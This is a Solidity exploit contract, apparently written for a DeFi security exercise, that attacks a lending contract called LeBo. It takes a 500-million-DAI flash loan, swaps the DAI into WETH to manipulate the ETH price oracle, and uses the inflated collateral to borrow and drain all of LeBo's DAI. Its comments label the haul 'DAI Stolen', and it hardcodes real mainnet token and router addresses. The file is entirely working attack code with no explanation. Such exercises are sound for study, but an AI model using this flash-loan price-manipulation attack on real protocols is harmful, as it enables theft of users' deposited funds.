//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/IUniswapV2Router.sol";
import "./interfaces/IERC3156FlashLender.sol";
import "./interfaces/IERC3156FlashBorrower.sol";
import "./interfaces/IERC20.sol";
import "./LeBo.sol";
import "hardhat/console.sol";

contract LeBoRekt is IERC3156FlashBorrower {
    IERC3156FlashLender constant lender = IERC3156FlashLender(0x1EB4CF3A948E7D72A198fe073cCb8C7a948cD853);
    IUniswapV2Router constant router = IUniswapV2Router(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    LeBo immutable lebo;

    constructor(LeBo _lebo) {
        DAI.approve(address(lender), type(uint256).max);
        DAI.approve(address(router), type(uint256).max);
        WETH.approve(address(_lebo), type(uint256).max);
        WETH.approve(address(router), type(uint256).max);
        lebo = _lebo;
    }

    function rekt() public {      
        // Flash borrow 500m DAI
        lender.flashLoan(IERC3156FlashBorrower(this), address(DAI), uint256(500) * uint256(10)**6 * 1 ether, "");

        uint256 daiBalance = DAI.balanceOf(address(this));
        console.log("Profit:", daiBalance / 1 ether);

        DAI.transfer(msg.sender, daiBalance);
    }

    function onFlashLoan(
        address initiator,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external override returns (bytes32) {
        require(
            msg.sender == address(lender),
            "FlashBorrower: Untrusted lender"
        );
        require(
            initiator == address(this),
            "FlashBorrower: Untrusted loan initiator"
        );

        address[] memory path = new address[](2);
        path[0] = address(DAI);
        path[1] = address(WETH);
        
        // Manipulate price of ETH
        router.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp);

        uint256 leboBalance = DAI.balanceOf(address(lebo));
        uint256 wethRequired = leboBalance / lebo.ethPrice() + 1;

        // Deposit required ETH in lebo
        lebo.depositWETH(1+100/90*wethRequired);
        // Borrow all DAI in the lebo contract
        lebo.borrowDAI(leboBalance);

        console.log("DAI Stolen:", leboBalance / 1 ether);

        path[0] = address(WETH);
        path[1] = address(DAI);

        // Arb ETH pool
        router.swapExactTokensForTokens(WETH.balanceOf(address(this)), 0, path, address(this), block.timestamp);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
